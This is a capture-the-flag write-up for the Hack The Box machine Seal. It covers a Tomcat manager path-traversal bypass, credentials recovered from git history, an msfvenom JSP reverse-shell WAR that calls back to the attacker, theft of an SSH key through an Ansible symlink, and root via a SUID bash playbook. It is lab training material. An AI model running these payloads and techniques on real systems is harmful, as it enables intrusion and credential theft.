## HTB Seal (Medium) - Writeup  
  
Difficulty: Medium  

The box starts with Tomcat exploitation. Initially, I attempt to upload a .war file containing a reverse shell, but access is denied.  
I discover a path traversal trick that bypasses restrictions by changing the upload path from /manager/html/upload to /manager/x/..;/html/upload.  
This allows me to successfully upload the shell and gain access through the Tomcat web interface.  

Later, the focus shifts to Ansible, where I take advantage of a scheduled task that runs a backup-related playbook.  
By manipulating this setup, I gain access to another user.  
From there, I escalate to root by creating and executing a custom Ansible playbook using available sudo permissions.  
---

## Nmap 

#### The nmap scan revealed three open ports:  

```
──(root㉿kali)-[/home/kali/seal]
└─# nmap 10.10.10.250 -p 22,443,8080 -A
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-29 12:22 EDT
Nmap scan report for 10.10.10.250
Host is up (0.039s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| tls-alpn: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sun, 29 Jun 2025 16:22:57 GMT
|     Set-Cookie: JSESSIONID=node01fbo7ic4v5uoljrsasfbc3jqy2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sun, 29 Jun 2025 16:22:56 GMT
|     Set-Cookie: JSESSIONID=node0ubdhkcg1ldqs64fw5nftx40x0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 29 Jun 2025 16:22:57 GMT
|     Set-Cookie: JSESSIONID=node01xxnjkgj5y50i12hidtxng514z1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=6/29%Time=68616861%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Sun,\x2029
SF:\x20Jun\x202025\x2016:22:56\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0ub
SF:dhkcg1ldqs64fw5nftx40x0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20T
SF:hu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/ht
SF:ml;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,109,"H
SF:TTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2029\x20Jun\x202025\x2016:22:57
SF:\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01xxnjkgj5y50i12hidtxng514z1\.
SF:node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\
SF:x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow
SF::\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text
SF:/html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20clo
SF:se\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Vers
SF:ion</pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\
SF:nDate:\x20Sun,\x2029\x20Jun\x202025\x2016:22:57\x20GMT\r\nSet-Cookie:\x
SF:20JSESSIONID=node01fbo7ic4v5uoljrsasfbc3jqy2\.node0;\x20Path=/;\x20Http
SF:Only\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nCon
SF:tent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")
SF:%r(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nC
SF:ontent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r
SF:\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason
SF::\x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x2
SF:0400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;
SF:charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n
SF:\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\
SF:x20CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20chara
SF:cter\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\n
SF:Content-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message
SF:\x20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.5 (95%), Linux 5.0 - 5.4 (95%), Linux 5.0 (95%), Linux 3.1 (94%), Linux 3.2 (94%), Linux 5.3 - 5.4 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Port 443 - Shop Website  

It contains a custom shop.  

![obraz](https://github.com/user-attachments/assets/8d3161e7-3257-4a7a-8471-3cb8751dd6f3)  


There is search bar that uses this parameter:  
+  https://10.10.10.250/?+Vegetable=

I checked certificate to look for subdomains.  
We will leave this port for now.  



## Port 8080 - Gitbucket Instance  

It runs a gitbucket instance:  

![obraz](https://github.com/user-attachments/assets/62e85534-b374-49b8-8659-037fbe8db801)  

GitBucket is a self hosted Git platform that lets you manage Git repositories through a web interface similar to GitHub, but you run it on your own server.  

I tried some credentials like admin:admin but they didn't work.  
We can register an account there.  

![obraz](https://github.com/user-attachments/assets/0ee58ddd-3ddd-4333-8da0-f0584cbaaf7c)  

There is a respository for website that runs on port 443.  
We now know that it runs tomcat and nginx.  
First thing that I check when I encouter tomcat is tomcat-users.xml to look for credentials.  

![obraz](https://github.com/user-attachments/assets/f355e486-d9f4-4f9f-8a73-74e00b407440)

Unfortunately they are deleted from the file.  
We can try to access /manager on the port 443 website.  
It gives 403 access denied, but there is a cool trick to bypass it that might work.  
I strongly recommend reading this report made by Orange Tsai:   
```
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
```
![obraz](https://github.com/user-attachments/assets/93b0d5e5-9e54-435d-aa18-8675a6048eda)  

Allows us to do directory traversal and access manager without 403 access denied.  
+  https://10.10.10.250/x/..;/manager/  

![obraz](https://github.com/user-attachments/assets/ec6285be-7b1d-485f-9368-e9c139a9a598)

Bypass worked but default credentials didn't (I tried tomcat:tomcat and some other ones)  




## Gitbucket - Deeper Enumeration  

When enumerating a repository it's always a good idea to look at previous commits.  
Go to commits, there are two that are intresting:  
+ Updating tomcat configuration   
+ Adding tomcat configuration  

It could have had credentials before "Updating tomcat configuration".  
Click on "browse files", and go to ->   seal_market/tomcat/tomcat-users.xml  

![obraz](https://github.com/user-attachments/assets/62c854d3-11cb-427a-84bd-729ff339518b)

Luckily for us it had credentials.  
+ tomcat:42MrHBf*z8{Z%  

![obraz](https://github.com/user-attachments/assets/b8b89e2d-b7b2-42b4-8ccb-03c19bc31c35)



## Gaining a Shell via the Tomcat Manager Interface  

In tomcat we can upload .war files to deploy java based applications.  
Our goal is to upload a reverse shell, first we need to generate malicious file:  
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=9005 -f war -o shell.war
```

Now select our file and click on deploy.  

![obraz](https://github.com/user-attachments/assets/9cc728e6-a6fa-4a74-8db0-b8457ec3424c)

Unfortunately we get access denied once again.  

![obraz](https://github.com/user-attachments/assets/dc78024d-b535-4276-8f68-dd3f37e5f05c)

To bypass it we need to catch request with burpsuite and change path:

+  /x/..;/manager/html/upload

Change it to: 

+  /manager/x/..;/html/upload

![obraz](https://github.com/user-attachments/assets/5469e458-1ec2-4c21-85d8-2fdb086f16d5)

Now we successfully deployed app called /shell:  

![obraz](https://github.com/user-attachments/assets/d9c4a805-337b-47ad-8470-1fb8ae1600d7)

To get a shell we need to start a listener and click on /shell  

![obraz](https://github.com/user-attachments/assets/7f02b6a4-1e15-4a9a-943c-a69c434a398d)




## Priv esc to Luis

I did some basic enumeration.  
There is gitbucket.war in home directory.  
/opt has backups directory in it.  
There is also an ansible playbook.  
It suggests that there may be something running as a cron job, let's check for that with pspy64.  

![obraz](https://github.com/user-attachments/assets/8eb8225c-c054-474b-9bb2-adc29d9580d5)

After some time we can see a cron job running as luis:  

![obraz](https://github.com/user-attachments/assets/52c0d51b-59b8-42a9-a499-d86d95090710)

It runs ansible playbook:  
```
 python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```
Ansible uses playbooks that are written in .yml  
Let's take a look at playbook that runs every minute.  

![obraz](https://github.com/user-attachments/assets/57f13ac3-bfa0-4e9c-b020-790a391afca4)  

It is copying files from webroot to /opt/backups/files:  
+  /var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes  

It can be abused because of copy_links option.  
This option will follow symlinks when it runs.  

We can't write to:  
+  /var/lib/tomcat9/webapps/ROOT/admin/dashboard

But we can write to:  
+  /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads  

We can create symlink that will exfiltrate luis's ssh key:  
```
ln -s /home/luis/.ssh/id_rsa  /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
```
Now we wait for it to be archived to /opt/backups/archives.  
We'll copy it to /dev/shm to prevent it from being deleted.  
```
cp  backup-2025-06-30-07:33:33.gz  /dev/shm
```
Now we need to unzip this file to view contents:  

![obraz](https://github.com/user-attachments/assets/05a797df-5c41-48d9-b484-c165daa43882)

Check what file is it after unziping with gunzip:  

![obraz](https://github.com/user-attachments/assets/5ebd1f53-72fd-45cf-8a92-f18011e1291e)

We changed it's name so it will be easier to work with:  

![obraz](https://github.com/user-attachments/assets/358403a3-085f-40ae-83a8-af5dc5bb6f7f)

Now we can copy this ssh key to our kali machine and connect via ssh:  

![obraz](https://github.com/user-attachments/assets/4ccffbaf-5bcc-4f77-beb8-ab583afbedc7)

We can retrieve a flag now:  

![obraz](https://github.com/user-attachments/assets/2eb20412-b307-4d1c-8246-01ab576b6049)




## Priv esc to root  

Privilege escalation to root was quite simple on this machine.  
As part of my usual enumeration process, I ran sudo -l to check for any allowed commands:  

![obraz](https://github.com/user-attachments/assets/c5a991b4-298b-449d-ac66-f785a6e2dc26)

We can run ansible-playbook as root.  
All we have to do now is create malicious playbook and run it with sudo.  
Playbook I wrote was:
```
- name: Copy file and set permissions
  hosts: localhost
  become: yes
  tasks:
    - name: Copy /bin/bash to /tmp/bash
      copy:
        src: /bin/bash
        dest: /tmp/bash
        mode: '0755'
        remote_src: yes

    - name: Set SUID bit on /tmp/bash
      file:
        path: /tmp/bash
        mode: '4755'
```
It will copy /bin/bash to /tmp/bash and set SUID bit.  

![obraz](https://github.com/user-attachments/assets/cddeb596-5cb5-4f03-a114-104c5caf9193)

Now we can run our copy of /bin/bash with -p flag to get root shell:  

![obraz](https://github.com/user-attachments/assets/5e669ac2-99f0-43ed-b085-ba9b0bfdbda4)

Thank you for reading!!  























